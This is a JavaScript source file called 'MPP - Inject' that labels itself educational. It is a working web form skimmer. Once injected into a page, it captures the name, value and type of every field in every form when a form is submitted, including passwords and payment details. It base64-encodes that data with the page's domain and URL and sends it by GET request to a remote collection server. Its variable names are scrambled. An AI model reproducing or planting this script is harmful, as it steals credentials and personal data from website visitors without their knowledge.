/*!
 * MPP - Inject
 *
 * Copyright (c) 2018, Ivan Sostarko (ivan.sostarko at hotmail.com)
 *
 * Github (https://github.com/IvanSostarko/mpp-inject)
 *
 * This program is created only for educational purposes.
 *
 * Licensed under the MIT License.
 *
 */
'use strict';

// Debug Mode
var bcTRd_debug = true;

// Get Domain
var xyc_host = window.location.hostname;

// Get Protocol
var xycsa_protocol = window.location.protocol;

//  Get URL
var xcye_url = window.location.href;

//  Get Path
var vcd_path = window.location.pathname;

//  Remote server
var xyca_remote_server = "http://0.0.0.0:8001/";


/*
 * Little hack
 *
 * While debugging you should use envent click not submit
 *
 */
var xcv_event_type = "submit";

if (bcTRd_debug) {
    xcv_event_type = "click";
} else {
    xcv_event_type = "submit";
}


/* On submit call function  sdsadxc_onsubmit*/
document.addEventListener(xcv_event_type, sdsadxc_onsubmit);


/* Call ajax function */
var HttpClient = function() {

    this.get = function(aUrl, aCallback) {
        var anHttpRequest = new XMLHttpRequest();
        anHttpRequest.onreadystatechange = function() {
            if (anHttpRequest.readyState == 4 && anHttpRequest.status == 200)
                aCallback(anHttpRequest.responseText);
        }

        anHttpRequest.open("GET", aUrl, true);
        anHttpRequest.send(null);
    }
}


/* Call API Request */
var cvaw_api = function(xyc_host, xycsa_protocol, xcye_url, vcd_path, xcvs_name, xycq_value, vxcv_type) {


    // Debug
    if (bcTRd_debug) {
        console.log("Function for API Activated.");
    }

    // Crypt params name
    var vcx_payload = new Object();
    vcx_payload.prmrs_domain = xyc_host;
    vcx_payload.prmrs_protocol = xycsa_protocol;
    vcx_payload.prmrs_url = xcye_url;
    vcx_payload.prmrs_path = vcd_path;
    vcx_payload.prmrs_name = xcvs_name;
    vcx_payload.prmrs_value = xycq_value;
    vcx_payload.prmrs_type = vxcv_type;

    // Create JSON for Js Object
    var xyca_jsonString = JSON.stringify(vcx_payload);

    // Print JSON
    if (bcTRd_debug) {
        console.log(xyca_jsonString);
    }


    // Call Http client and push data to remote server
    var client = new HttpClient();

    // Encode json with btoa
    client.get(xyca_remote_server + '?payload=' + btoa(xyca_jsonString), function(response) {
        // Debug
        if (bcTRd_debug) {
            console.log("Api Success");
        }
    });



}


/* Main Function */
function sdsadxc_onsubmit() {


    // Get All Form Values in Collection*/
    var xycxyc_getAllFormValues = document.forms;


    // Debug
    if (bcTRd_debug) {
        console.log("Script started");
    }

    // Debug
    if (bcTRd_debug) {
        console.log(xycxyc_getAllFormValues);
    }

    // Get all data from all forms on page
    for (var a = 0; a < document.forms.length; a++) {

        var x = document.forms[a++];
        var xycq_value;
        var xcvs_name;
        var vxcv_type;
        var i;


        for (i = 0; i < x.length; i++) {
            xcvs_name = x.elements[i].name;
            xycq_value = x.elements[i].value;
            vxcv_type = x.elements[i].getAttribute('type');

            // Send data to API function
            cvaw_api(xyc_host, xycsa_protocol, xcye_url, vcd_path, xcvs_name, xycq_value, vxcv_type);

            if (bcTRd_debug) {
                console.log("Domain: " + xyc_host);
                console.log("Protocol: " + xycsa_protocol);
                console.log("URL: " + xcye_url);
                console.log("Path: " + vcd_path);
                console.log("Name: " + xcvs_name);
                console.log("Value: " + xycq_value);
                console.log("Type: " + vxcv_type);
            }
        }

    }


    // Debug
    if (bcTRd_debug) {
        console.log("Number of scanned forms: " + xycxyc_getAllFormValues.length);
    }

}